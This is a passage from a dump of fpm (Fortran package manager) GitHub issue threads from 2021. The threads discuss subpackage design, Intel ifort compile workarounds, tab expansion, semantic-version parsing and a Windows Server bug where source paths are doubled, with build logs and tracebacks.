                    "text": "How does Cargo do it? Can somebody investigate and post a summary? If they don't need it, then maybe we don't need it either. Although I am not against.\nI noticed that for example the Rust compiler has a bunch of independent Cargo libraries that compose it:\nhttps://github.com/rust-lang/rust/tree/master/compiler\nEach directory there is a Cargo package. If you click on one, you see how they specify the dependencies between these packages: https://github.com/rust-lang/rust/blob/a8f6e614f86be429b5862f30e023063f619aeed2/compiler/rustc_borrowck/Cargo.toml\nIs that the best possible design? I don't have an opinion yet."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-10-27 15:30:03+00:00",
                    "text": "The strategy with the Rust compiler and Cargo seems to be having multiple project in subdirectories and declare dependencies using relative paths. We can already do this with fpm, if there is at least one meta-package in the project root, which depends on all subpackages in the project. However, we don't have a way to access an fpm project which is not specified in the project root (yet). Depending on the meta-package would make all subpackages available.\nThis seems like a possible approach for this setup and is already possible now. Is this a viable setup and should we focus on improving fpm in this direction?"
                },
                {
                    "user": "certik",
                    "date": "2021-10-27 20:03:16+00:00",
                    "text": "This seems like a possible approach for this setup and is already possible now. Is this a viable setup\n\nFrom Cargo's experience I would say it's definitely viable.\n\nand should we focus on improving fpm in this direction?\n\nGiven how close we are, it seems it would be worth it to finish it to make it work.\nHowever, is there some other design that is better? The only other design I can think of is to produce multiple libraries per package, as discussed in this issue.\nHow much would that complicate the fpm design to allow multiple libraries? If it is a big complication, perhaps we don't need it and we can just use the Rust's approach."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-10-28 07:17:54+00:00",
                    "text": "From Cargo's experience I would say it's definitely viable.\n\nWe have discarded constraints present in Cargo in the past, e.g. having the link field restricted to a single library. Also, in this case the workaround would have been to declare multiple local subpackages which each link against one library and depend on each other in the order of the link line. Not sure if this approach is used in any Rust project, but I found the idea impractical.\nLocal subpackages seem to be Cargo's way to work around deliberate restrictions of the package manifest. The question is whether this way is convenient enough in practice for our users."
                }
            ]
        },
        {
            "number": 523,
            "user": "awvwgk",
            "date": "2021-07-19 13:36:23+00:00",
            "title": "Fix compilation error in ifort",
            "text": "Intel Fortran (ifort) is choking on the TOML proxy module in fpm, due to overloading the get_value interface in the proxy with an fpm specific data type. For some reason this alters the signature of the toml_table data type and causes a compilation error.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-07-28 02:31:49+00:00",
                    "text": "Note this fixed #520, and using an earlier kludged version of my own that worked with ifort, ifort let me verify two bugs in fpm and is very helpful in helping ensure fpm is as standard-conforming as possible going into the future. Can anyone else take a look?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-07-28 08:05:23+00:00",
                    "text": "With two approvals I'll go ahead and merge later today.\nNext thing to discuss is whether we want to start testing ifort in the CI as well."
                }
            ]
        },
        {
            "number": 522,
            "user": "urbanjost",
            "date": "2021-07-18 23:47:19+00:00",
            "title": "remove warnings and fix truncated help text",
            "text": "The help text was being truncated for the command syntax sections and the number of unused variables that has accumulated was obscuring significant warnings and some trailing whitespace that keeps coming up in PRs was trimmed. Should not change logic at all but removes around fifty warning messages and fixes the trimmed messages.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-07-19 13:26:29+00:00",
                    "text": "@awvwgk.  A question about TOML.  While I was loo king for low-hanging fruit I came across a line in the TOML code that I thought should produce a warning where it had \"ptr(1:0)\".  Is that a trick to pass a null pointer I did not know?  It produced no warning with any compiler I tried.  Also, if you take this version and if you take all the USE statements that import TOML_TABLE\nand import them from  the TOMLF module, but leave all the others alone, it compiles with the Intel classic module (ifort) but I could not find anywhere were that should be the case  (otherwise it says TOML_TABLE is imported simultaneously from two modules but does not indicate where the overlap is). By eye I went though all of it and as far as I could tell it is a compiler bug, maybe because TOML_TABLE was created by extension and the others are not.  If there is anything you see that should be a separate PR,  but thought I would mention it, as I find it useful to test with as many compilers as I can and if that is a bug I want to reduce it to a reproducer and get it into Intel. The only relationship to this PR is that it is handy to use multiple compilers for sweeping for items like this PR is cleaning up and I keep forgetting to ask it otherwise:>"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-07-19 13:37:36+00:00",
                    "text": "This might be easier to explain with a patch (see #523). Probably a bug in Intel Fortran, but I gave up on reporting those."
                }
            ]
        },
        {
            "number": 521,
            "user": "urbanjost",
            "date": "2021-07-18 19:52:11+00:00",
            "title": "expand tabs",
            "text": "",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2021-07-18 19:53:34+00:00",
                    "text": "minimal changes to expand tabs before searching for INCLUDE and USE statements"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-28 02:19:36+00:00",
                    "text": "this was refactored to simplify it from #510 per a request from @LKedward, but more importantly closes #508. The basic change is very simple, with a little complication to reduce the number of calls to LOWER(3f) by a factor of ten, as suggested by The OP for #508. To reintroduce some of the other parts that emerged originally in #510  (a fully implemented verbose mode, replacing STOP with a function to standardize the behavior and appearance of a STOP including only doing an ERROR STOP in verbose mode, possibly adding some color, a less verbose normal build...) this needs to progress or the other proposals/fixes will have a lot of conflicts.  Anyone have time to review? @awvwgk -- you had looked at the previous (more complicated) #510 version?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-07-31 19:21:23+00:00",
                    "text": "Since we only need to cope with tabs when parsing, can't we safely replace them one to one with spaces? The parsed lines are only used internally in fpm, therefore a simple replacement might be sufficient here."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-31 21:29:53+00:00",
                    "text": "Already had the routine for expanding tabs, tried simple spaces versus expanding and the timing on a package with over 1 000, source files and > 100 000, lines of source it made no difference, and it is also used as input to the checksum and there are some edge cases where the tabs could be inside of string constants that that could decide incorrectly not to rebuild without expansion; admittedly not likely to be a common issue but since it did not cause a performance issue (and like I mentioned, I have had expand for a long time ( it was first used for this purpose (removing tabs from Fortran source files because we were using several compilers that did not accept them in input files)!  so it seemed worth the almost-no-cost performance difference to eliminate the issue. I would prefer to do the expansion to the common eight-stop format as-is because of that."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-31 21:33:16+00:00",
                    "text": "Odd. My browser indicates there are now conflicts but will not let me view them."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-09-05 16:24:21+00:00",
                    "text": "This is the third refactoring  where it originally had no conflicts and when I updated my fork from the master I did not get any conflicts and the web page says the changes are to big to show them. I do not want to start the approval process over again with a new pull request like last time.  What commands are needed to see the conflicts. I have made two different pulls and they all show it without conflicts.\nNEVER MIND -- the changes just took an unusual amount of time to show up"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 16:50:00+00:00",
                    "text": "Thanks, I'll go ahead and merge now."
                }
            ]
        },
        {
            "number": 520,
            "user": "urbanjost",
            "date": "2021-07-15 13:37:36+00:00",
            "title": "building fpm with ifort",
            "text": "Is there any interest in a version of fpm that can be built with the Intel ifort compiler?  There is what I think is a bug in ifort that can be worked around, as demonstrated by the single-file build in\nhttps://github.com/urbanjost/fpm-tools/blob/main/tools/bootstrap/fpm_intel.F90\nbut it we just want to stick with gfortran for building fpm itself I don't want to make the kludge (essentially, changing the USE FPM_TOML to a USE TOMLF for TOML_TABLE). If you want to see the error, look for the lines with !x! and switch which module TOML_TABLE is used from).\nOther than it being useful during development of fpm to use multiple compilers and their associated tools (not a trivial advantage by itself) does anyone have a use-case like an environment where everything must be built from source and a recent gfortran(1) is not installed?  That is, is anyone being held back from using fpm(1) that would be able to use it if it built with ifort(1)?",
            "comments": [
                {
                    "user": "arjenmarkus",
                    "date": "2021-07-15 13:53:21+00:00",
                    "text": "On Windows, gfortran is not always easy to install - not impossible, but\nthere is a wealth of possibilities, whereas people may be more used to\nenvironments like MS Visual Studio that hide the details of the build\nprocess.\n\nOp do 15 jul. 2021 om 15:37 schreef urbanjost ***@***.***>:\n\u2026\n Is there any interest in a version of fpm that can be built with the Intel\n ifort compiler? There is what I think is a bug in ifort that can be worked\n around, as demonstrated by the single-file build in\n\n https://github.com/urbanjost/fpm-tools/blob/main/tools/bootstrap/fpm_intel.F90\n but it we just want to stick with gfortran for building fpm itself I don't\n want to make the kludge (essentially, changing the USE FPM_TOML to a USE\n TOMLF for TOML_TABLE). If you want to see the error, look for the lines\n with !x! and switch which module TOML_TABLE is used from).\n\n Other than it being useful during development of fpm to use multiple\n compilers and their associated tools (not a trivial advantage by itself)\n does anyone have a use-case like an environment where everything must be\n built from source and a recent gfortran(1) is not installed? That is, is\n anyone being held back from using fpm(1) that would be able to use it if it\n built with ifort(1)?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#520>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR6HWQTQIDFTBTSWN2LTX3QCZANCNFSM5ANSJ3FA>\n ."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-07-15 14:54:54+00:00",
                    "text": "I compiled the current version with Intel oneAPI and that worked fine. I\nhave not tested it to any useful extent, but at least the first step was\ndone.\n\nOp do 15 jul. 2021 om 15:53 schreef Arjen Markus ***@***.***\n\u2026\n:\n On Windows, gfortran is not always easy to install - not impossible, but\n there is a wealth of possibilities, whereas people may be more used to\n environments like MS Visual Studio that hide the details of the build\n process.\n\n Op do 15 jul. 2021 om 15:37 schreef urbanjost ***@***.***>:\n\n> Is there any interest in a version of fpm that can be built with the\n> Intel ifort compiler? There is what I think is a bug in ifort that can be\n> worked around, as demonstrated by the single-file build in\n>\n> https://github.com/urbanjost/fpm-tools/blob/main/tools/bootstrap/fpm_intel.F90\n> but it we just want to stick with gfortran for building fpm itself I\n> don't want to make the kludge (essentially, changing the USE FPM_TOML to a\n> USE TOMLF for TOML_TABLE). If you want to see the error, look for the lines\n> with !x! and switch which module TOML_TABLE is used from).\n>\n> Other than it being useful during development of fpm to use multiple\n> compilers and their associated tools (not a trivial advantage by itself)\n> does anyone have a use-case like an environment where everything must be\n> built from source and a recent gfortran(1) is not installed? That is, is\n> anyone being held back from using fpm(1) that would be able to use it if it\n> built with ifort(1)?\n>\n> \u2014\n> You are receiving this because you are subscribed to this thread.\n> Reply to this email directly, view it on GitHub\n> <#520>, or unsubscribe\n> <https://github.com/notifications/unsubscribe-auth/AAN6YR6HWQTQIDFTBTSWN2LTX3QCZANCNFSM5ANSJ3FA>\n> .\n>"
                }
            ]
        },
        {
            "number": 518,
            "user": "molinav",
            "date": "2021-07-14 16:09:24+00:00",
            "title": "fpm build fails with valid semantic version",
            "text": "It seems that fpm is expecting version numbers only in the format \"X.Y.Z\", with the minor and patch versions being optional. However, semantic versioning allows to have additional data after the first three numbers, which is useful e.g. to indicate development versions or specific builds.\nfpm version:\nvic@onyx:~$ fpm --version\nVersion:     0.3.0, alpha\nProgram:     fpm(1)\nDescription: A Fortran package manager and build system\nHome Page:   https://github.com/fortran-lang/fpm\nLicense:     MIT\nOS Type:     Linux\nSteps to reproduce the problem:\nfpm new testmodule\ncd testmodule\nsed -i 's/version = \"0.1.0\"/version = \"0.1.0+dev\"/' fpm.toml\nfpm build\nActual traceback:\nvic@onyx:~$ fpm new testmodule\n + mkdir -p testmodule\n + cd testmodule\n + mkdir -p testmodule/src\n + mkdir -p testmodule/app\n + mkdir -p testmodule/test\n + git init testmodule\nInitialised empty Git repository in /home/vic/testmodule/.git/\nfpm: Leaving directory '/home'\nvic@onyx:~$ cd testmodule\nvic@onyx:~/testmodule$ sed -i 's/version = \"0.1.0\"/version = \"0.1.0+dev\"/' fpm.toml\nvic@onyx:~/testmodule$ fpm build\nInvalid character in version number\n  | 0.1.0+dev\n  |-----^^\nERROR STOP 1\n\nError termination. Backtrace:\n#0  0x48de81 in ???\n#1  0x48e129 in ???\n#2  0x48f112 in ???\n#3  0x40b3e9 in __fpm_MOD_cmd_build\n\tat ./src/fpm.f90:259\n#4  0x4029f1 in MAIN__\n\tat app/main.f90:67\n#5  0x40195e in main\n\tat app/main.f90:10\nvic@onyx:~/testmodule$\nExpected traceback:\nThe library should be built without getting terminated, as it happens when one runs the steps from above but without replacing the initial version number \"0.1.0\".",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-07-26 09:58:57+00:00",
                    "text": "The implemented semantic version parser only supports the semver v1 specs right now. Having a more complete versioning library, maybe as separate fpm project, would be required at some point to support the full semver v2 specs at some point and implement accurate version checks."
                }
            ]
        },
        {
            "number": 517,
            "user": "urbanjost",
            "date": "2021-07-13 20:05:56+00:00",
            "title": "Fix run",
            "text": "When --runner was used a sometimes unallocated variable was being used.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-07-17 18:57:18+00:00",
                    "text": "Also a small fix so now merging. Thanks!"
                }
            ]
        },
        {
            "number": 516,
            "user": "urbanjost",
            "date": "2021-07-13 18:54:40+00:00",
            "title": "initialize allocatable strings before using in a comparison",
            "text": "gfortran is not complaining but the strings should not be compared when they are not initialized.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-07-17 18:56:22+00:00",
                    "text": "This is a small fix so I'll now merge. Thanks @urbanjost!"
                }
            ]
        },
        {
            "number": 513,
            "user": "urbanjost",
            "date": "2021-07-11 18:28:19+00:00",
            "title": "suggest that until production version numbers are used PR numbers be added to version string in fpm",
            "text": "As the version number is not always changed while in alpha release, I think it would be handy if the version string included the PR under which the version was created, and/or the git(1) identifier. It could even be a new line in the version information produced by\nfpm --version",
            "comments": []
        },
        {
            "number": 512,
            "user": "praynaud",
            "date": "2021-07-10 20:19:45+00:00",
            "title": "Bug Report: `fpm_source_parsing.f90` searches for wrong file",
            "text": "Summary\nWhen trying to build and test with fpm, an apparent error in parsing results fpm looking for the wrong file and crashing.\nSystem Configuration\n\n\nWindows 10 on AWS virtual machine t3.XL\n\nEdition: Windows Server 2016 Datacenter\nVersion: 1607\nOS build: 14393.4467\nSystem type: 64-bit operating System, x64-based processor\n\n\n\nCompiler\n\nIntel Fortran: Intel(R) Fortran Intel(R) 64 Compiler Classic for applications running on Intel(R) 64, Version 2021.2.0 Build 20210228_000000\n\n\n\nfpm versions 0.3.0 (latest release version as of 07/09/2021)\n\n\nError Description and Relevant Code\nI create a brand new project with fpm by typing in the Windows command prompt:\nZ:\\Documents\\GitHub>fpm new BUG\nThe command prompt output is:\n + mkdir BUG\n + cd BUG\n + mkdir BUG\\src\n + mkdir BUG\\app\n + mkdir BUG\\test\n + git init BUG\nInitialized empty Git repository in Z:/Documents/GitHub/BUG/.git/\nfpm: Leaving directory 'Z:'\nI then run the following commands to build my new fpm default project and it crashes:\nZ:\\Documents\\GitHub>cd BUG\nZ:\\Documents\\GitHub\\BUG>set FLAGS=--flag /standard-semantics --flag /Qcoarray=single --flag /Z7 --flag /fpp\nZ:\\Documents\\GitHub\\BUG>fpm build --compiler ifort %FLAGS%\n + mkdir build\\dependencies\nAt line 86 of file .\\src\\fpm_source_parsing.f90\nFortran runtime error: Cannot open file 'app\\main.f90\\main.f90': No such file or directory\n\nError termination. Backtrace:\n\nCould not print backtrace: libbacktrace could not find executable to open\n#0  0xffffffff\n#1  0xffffffff\n#2  0xffffffff\n#3  0xffffffff\n#4  0xffffffff\n#5  0xffffffff\n#6  0xffffffff\n#7  0xffffffff\n#8  0xffffffff\n#9  0xffffffff\n#10  0xffffffff\n#11  0xffffffff\n#12  0xffffffff\n#13  0xffffffff\n#14  0xffffffff\n#15  0xffffffff\n#16  0xffffffff\nHere is the default fpm.toml file (updated with my contact info):\nname = \"BUG\"\nversion = \"0.1.0\"\nlicense = \"\"\nauthor = \"NRC\"\nmaintainer = \"Patrick.Raynaud@nrc.gov\"\ncopyright = \"2021 NRC\"\n[build]\nauto-executables = true\nauto-tests = true\nauto-examples = true\n[install]\nlibrary = false\n\nThe correct file path for the file that crashes fpm is 'app/main.f90'.  For some reason, the file parser seems to be appending the file name twice after the path, which results in an incorrect file path.\nPlease help!",
            "comments": [
                {
                    "user": "praynaud",
                    "date": "2021-07-10 20:20:10+00:00",
                    "text": "@everythingfunctional Issue submitted!"
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-11 12:42:20+00:00",
                    "text": "Thanks for reporting @praynaud - just to check, does this error only occur with the specific combination of flags and compiler that are shown in your report?"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-11 22:54:56+00:00",
                    "text": "Wanted to set up ifort on my Windows box anyway, and this looked like a motivation but something went wrong. So even though this is getting looked at,  in addition to what @LKedward asked if you add the --usage switch to the fpm command it will display how the command line got parsed, and if you run \"fpm --version\" it will show the OS it thinks it is running on, which might be useful. Note you should be able to quote all the options together ... --flag \"/standard-semantics /Qcoarray=single  /Z7 /fp\".  The output of the following would all be useful\nfpm build --compiler ifort --flag %FLAGS% --usage -V\nfpm build --compiler ifort --flag %FLAGS% --list\nfpm build --compiler ifort --flag %FLAGS% --show-model"
                },
                {
                    "user": "praynaud",
                    "date": "2021-07-12 14:01:21+00:00",
                    "text": "@urbanjost\nHere is the result from running the commands you suggested:\nZ:\\>cd Homes\\PAR3\\Documents\\GitHub\\BUG\n\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>call \"C:\\Program Files (x86)\\Intel\\oneAPI\\setvars.bat\"\n:: initializing oneAPI environment...\n   initializing Visual Studio command-line environment...\n   Visual Studio version 16.9.2 environment configured.\n   Visual Studio environment initialized for: 'x64'\n:  compiler -- latest\n:  debugger -- latest\n:  dev-utilities -- latest\n:  inspector -- latest\n:  itac -- latest\n:  mpi -- latest\n:  tbb -- latest\n:: oneAPI environment initialized ::\n\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>set FLAGS= --flag \"/standard-semantics /Qcoarray=single /Z7 /fpp\"\n\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>fpm --version\nVersion:     0.3.0, alpha\nProgram:     fpm(1)\nDescription: A Fortran package manager and build system\nHome Page:   https://github.com/fortran-lang/fpm\nLicense:     MIT\nOS Type:     Windows\n\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>fpm build --compiler ifort %FLAGS% --usage -V\nUSAGE:\nKEYWORD    SHORT PRESENT VALUE\nversion       v  F        [F]\nverbose       V  T        [T]\nusage         u  T        [T]\nshow-model       F        [F]\nprofile          F        [\" \"]\nlist             F        [F]\nhelp          h  F        [F]\nflag             T        [\"/standard-semantics /Qcoarray=single /Z7 /fpp\"]\ndirectory     C  F        [\" \"]\ncompiler         T        [\"ifort\"]\n\nUNNAMED\n000001[build                                        ]\n\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>fpm build --compiler ifort %FLAGS% --list\nAt line 86 of file .\\src\\fpm_source_parsing.f90\nFortran runtime error: Cannot open file 'app\\main.f90\\main.f90': No such file or directory\n\nError termination. Backtrace:\n\nCould not print backtrace: libbacktrace could not find executable to open\n#0  0xffffffff\n#1  0xffffffff\n#2  0xffffffff\n#3  0xffffffff\n#4  0xffffffff\n#5  0xffffffff\n#6  0xffffffff\n#7  0xffffffff\n#8  0xffffffff\n#9  0xffffffff\n#10  0xffffffff\n#11  0xffffffff\n#12  0xffffffff\n#13  0xffffffff\n#14  0xffffffff\n#15  0xffffffff\n#16  0xffffffff\n\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>fpm build --compiler ifort %FLAGS% --show-model\nAt line 86 of file .\\src\\fpm_source_parsing.f90\nFortran runtime error: Cannot open file 'app\\main.f90\\main.f90': No such file or directory\n\nError termination. Backtrace:\n\nCould not print backtrace: libbacktrace could not find executable to open\n#0  0xffffffff\n#1  0xffffffff\n#2  0xffffffff\n#3  0xffffffff\n#4  0xffffffff\n#5  0xffffffff\n#6  0xffffffff\n#7  0xffffffff\n#8  0xffffffff\n#9  0xffffffff\n#10  0xffffffff\n#11  0xffffffff\n#12  0xffffffff\n#13  0xffffffff\n#14  0xffffffff\n#15  0xffffffff\n#16  0xffffffff\n\nIs it normal that when using the --usage flag, BUILD is listed as UNNAMED?"
                },
                {
                    "user": "praynaud",
                    "date": "2021-07-12 14:30:54+00:00",
                    "text": "@LKedward\nEven with no flags, the same behavior occurs with the Intel compiler:\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>fpm build --compiler ifort --usage -V\nUSAGE:\nKEYWORD    SHORT PRESENT VALUE\nversion       v  F        [F]\nverbose       V  T        [T]\nusage         u  T        [T]\nshow-model       F        [F]\nprofile          F        [\" \"]\nlist             F        [F]\nhelp          h  F        [F]\nflag             F        [\" \"]\ndirectory     C  F        [\" \"]\ncompiler         T        [\"ifort\"]\n\nUNNAMED\n000001[build     ]\n\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>fpm build --compiler ifort --list\nAt line 86 of file .\\src\\fpm_source_parsing.f90\nFortran runtime error: Cannot open file 'app\\main.f90\\main.f90': No such file or directory\n\nError termination. Backtrace:\n\nCould not print backtrace: libbacktrace could not find executable to open\n#0  0xffffffff\n#1  0xffffffff\n#2  0xffffffff\n#3  0xffffffff\n#4  0xffffffff\n#5  0xffffffff\n#6  0xffffffff\n#7  0xffffffff\n#8  0xffffffff\n#9  0xffffffff\n#10  0xffffffff\n#11  0xffffffff\n#12  0xffffffff\n#13  0xffffffff\n#14  0xffffffff\n#15  0xffffffff\n#16  0xffffffff\n\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>fpm build --compiler ifort --show-model\nAt line 86 of file .\\src\\fpm_source_parsing.f90\nFortran runtime error: Cannot open file 'app\\main.f90\\main.f90': No such file or directory\n\nError termination. Backtrace:\n\nCould not print backtrace: libbacktrace could not find executable to open\n#0  0xffffffff\n#1  0xffffffff\n#2  0xffffffff\n#3  0xffffffff\n#4  0xffffffff\n#5  0xffffffff\n#6  0xffffffff\n#7  0xffffffff\n#8  0xffffffff\n#9  0xffffffff\n#10  0xffffffff\n#11  0xffffffff\n#12  0xffffffff\n#13  0xffffffff\n#14  0xffffffff\n#15  0xffffffff\n#16  0xffffffff\nThe only other compiler I have access to in this environment is the NAG compiler.  Same issue occurs:\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>nagfor\nNAG Fortran Compiler Release 6.2(Chiyoda) Build 6223\nWarning: No files specified\n\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>fpm build --compiler nagfor\nAt line 86 of file .\\src\\fpm_source_parsing.f90\nFortran runtime error: Cannot open file 'app\\main.f90\\main.f90': No such file or directory\n\nError termination. Backtrace:\n\nCould not print backtrace: libbacktrace could not find executable to open\n#0  0xffffffff\n#1  0xffffffff\n#2  0xffffffff\n#3  0xffffffff\n#4  0xffffffff\n#5  0xffffffff\n#6  0xffffffff\n#7  0xffffffff\n#8  0xffffffff\n#9  0xffffffff\n#10  0xffffffff\n#11  0xffffffff\n#12  0xffffffff\n#13  0xffffffff\n#14  0xffffffff\n#15  0xffffffff\n#16  0xffffffff\n\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>fpm build --compiler nagfor --usage -V\nUSAGE:\nKEYWORD    SHORT PRESENT VALUE\nversion       v  F        [F]\nverbose       V  T        [T]\nusage         u  T        [T]\nshow-model       F        [F]\nprofile          F        [\" \"]\nlist             F        [F]\nhelp          h  F        [F]\nflag             F        [\" \"]\ndirectory     C  F        [\" \"]\ncompiler         T        [\"nagfor\"]\n\nUNNAMED\n000001[build     ]"
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-12 15:12:07+00:00",
                    "text": "Thanks for clarifying that @praynaud. Unfortunately I'm currently struggling to reproduce the issue. I don't currently have access to a Windows server machine to try out your scenario exactly."
                },
                {
                    "user": "praynaud",
                    "date": "2021-07-12 16:06:32+00:00",
                    "text": "@LKedward Understood.  On my personal local Windows machine (Windows 10 Home, version: 20H2, OS build: 19042.1083, Experience: Windows Feature Experience Pack 120.2212.3530.0), I do not have any issues.\nOthers in my development group are moving from their virtual environments to their local machines, so at least work can continue for now, but would be great to try and resolve this one at some point down the road...  I'm happy to try more things on the Widows Server instance if you need me to.\nThanks!"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-13 13:12:10+00:00",
                    "text": "Thanks also. I could not duplicate your problem so if you do have some time if you could put the file\nfpm_intel.F90 in a scratch directory and compile\nit with \"ifort fpm_intel.F90 -o fpm\"  (I assume from your description you do not have gfortran(1) on this platform) if the executable it should make (\"./fpm\") runs and demonstrates the same problem we can instrument a copy of that file to produce some old-fashioned debug statements and perhaps track it down?   The compile will produce a LOT of *.mod files so make sure to build in a scratch directory. Definitely a back-door approach, but trying every platform I have access to did not produce the problem. If I am wrong and you do have gfortran on that platform, building it again with gfortran would be useful if the problem does not reproduce with ifort.  Looking through the code manually, I could find no obvious path that would produce the problem, so maybe the hard way with some old PRINT statements might solve it."
                },
                {
                    "user": "praynaud",
                    "date": "2021-07-14 11:51:38+00:00",
                    "text": "@urbanjost I compiled fpm_intel.F90 as instructed and used that executable, and my problem persists:\nZ:\\Homes\\PAR3\\Documents\\GitHub\\FPM_test>ifort /fpp fpm_intel.F90 -o fpm\nIntel(R) Fortran Intel(R) 64 Compiler Classic for applications running on Intel(R) 64, Version 2021.2.0 Build 20210228_000000\nCopyright (C) 1985-2021 Intel Corporation.  All rights reserved.\n\nfpm_intel.F90(7842): warning #6843: A dummy argument with an explicit INTENT(OUT) declaration is not given an explicit value.   [SELF]\nsubroutine new_keyval(self)\n----------------------^\nfpm_intel.F90(21736): remark #8291: Recommended relationship between field width 'W' and the number of fractional digits 'D' in this edit descriptor is 'W>=D+7'.\n         read(nan_string,'(g3.3)')valu\n----------------------------^\nMicrosoft (R) Incremental Linker Version 14.28.29913.0\nCopyright (C) Microsoft Corporation.  All rights reserved.\n\n-out:fpm.exe\n-subsystem:console\nfpm_intel.obj\nAfter copying the newly created fpm.exe in my test folder for the minimal problem called BUG:\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>fpm build --compiler ifort %FLAGS%\nforrtl: severe (29): file not found, unit -136, file Z:\\Homes\\PAR3\\Documents\\GitHub\\BUG\\app\\main.f90\\main.f90\nImage              PC                Routine            Line        Source\nfpm.exe            00007FF7D2C4CE4F  Unknown               Unknown  Unknown\nfpm.exe            00007FF7D2C310B3  Unknown               Unknown  Unknown\nfpm.exe            00007FF7D2ABC168  Unknown               Unknown  Unknown\nfpm.exe            00007FF7D2AB97FF  Unknown               Unknown  Unknown\nfpm.exe            00007FF7D2AB6668  Unknown               Unknown  Unknown\nfpm.exe            00007FF7D2A8C585  Unknown               Unknown  Unknown\nfpm.exe            00007FF7D2B40E1A  Unknown               Unknown  Unknown\nfpm.exe            00007FF7D2A81B1F  Unknown               Unknown  Unknown\nfpm.exe            00007FF7D2CBBE2E  Unknown               Unknown  Unknown\nfpm.exe            00007FF7D2CBC214  Unknown               Unknown  Unknown\nKERNEL32.DLL       00007FFD07C584D4  Unknown               Unknown  Unknown\nntdll.dll          00007FFD07EC1781  Unknown               Unknown  Unknown\nI will gladly take any recommendations/help offered, but I don't want to waste anyone's time.  For now, I have a workaround by working on my personal PC.  I really think this is related to the environment, which could be a pain to debug."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-07-14 19:12:25+00:00",
                    "text": "I think this might have a really simple explanation. DIR can show two names for a file. Seeing the results of the intel version,\nand looking through the code I am wondering what the output of  \"dir /b\" shows on your system?  I am not a regular user of MSWindows but right now because MSWindows is not POSIX-compliant the output of a DIR command is used to get the contents of directories. I think that if that is the problem that replacing \"dir /b\" with something like \"dir /n/b\" or only taking the last word of the output lines may be all that is needed.  Hate to bug someone else for such a basic request but I do not have access to a system where I can check  how your file server is set up. I should have asked for you to use the flags for creating symbols for the traceback too, but looking by eye through the code I do not see anything else."
                },
                {
                    "user": "praynaud",
                    "date": "2021-07-14 20:04:16+00:00",
                    "text": "@urbanjost\nI recompiled the fpm_intel.F90 with the traceback flag:\nZ:\\Homes\\PAR3\\Documents\\GitHub\\FPM_test>ifort /fpp /traceback fpm_intel.F90 -o fpm\nIntel(R) Fortran Intel(R) 64 Compiler Classic for applications running on Intel(R) 64, Version 2021.2.0 Build 20210228_000000\nCopyright (C) 1985-2021 Intel Corporation.  All rights reserved.\n\nfpm_intel.F90(7842): warning #6843: A dummy argument with an explicit INTENT(OUT) declaration is not given an explicit value.   [SELF]\nsubroutine new_keyval(self)\n----------------------^\nfpm_intel.F90(21736): remark #8291: Recommended relationship between field width 'W' and the number of fractional digits 'D' in this edit descriptor is 'W>=D+7'.\n         read(nan_string,'(g3.3)')valu\n----------------------------^\nMicrosoft (R) Incremental Linker Version 14.28.29913.0\nCopyright (C) Microsoft Corporation.  All rights reserved.\n\n-out:fpm.exe\n-subsystem:console\n-incremental:no\nfpm_intel.obj\nThen used that executable on the minimal example described above, which I called 'BUG':\nZ:\\Homes\\PAR3\\Documents\\GitHub\\BUG>fpm build --compiler ifort %FLAGS%\nforrtl: severe (29): file not found, unit -136, file Z:\\Homes\\PAR3\\Documents\\GitHub\\BUG\\app\\main.f90\\main.f90\nImage              PC                Routine            Line        Source\nfpm.exe            00007FF74F0BB6BF  Unknown               Unknown  Unknown\nfpm.exe            00007FF74F09F923  Unknown               Unknown  Unknown\nfpm.exe            00007FF74EF2C108  FPM_SOURCE_PARSIN       16692  fpm_intel.F90\nfpm.exe            00007FF74EF297AF  FPM_SOURCES_mp_PA       25499  fpm_intel.F90\nfpm.exe            00007FF74EF26618  FPM_SOURCES_mp_AD       25561  fpm_intel.F90\nfpm.exe            00007FF74EEFC585  FPM_mp_BUILD_MODE       26520  fpm_intel.F90\nfpm.exe            00007FF74EFB099A  FPM_mp_CMD_BUILD        26694  fpm_intel.F90\nfpm.exe            00007FF74EEF1B1F  MAIN__                  27287  fpm_intel.F90\nfpm.exe            00007FF74F12A6AE  Unknown               Unknown  Unknown\nfpm.exe            00007FF74F12AA94  Unknown               Unknown  Unknown\nKERNEL32.DLL       00007FFDEE3284D4  Unknown               Unknown  Unknown\nntdll.dll          00007FFDEE591781  Unknown               Unknown  Unknown\nRegarding the DIR 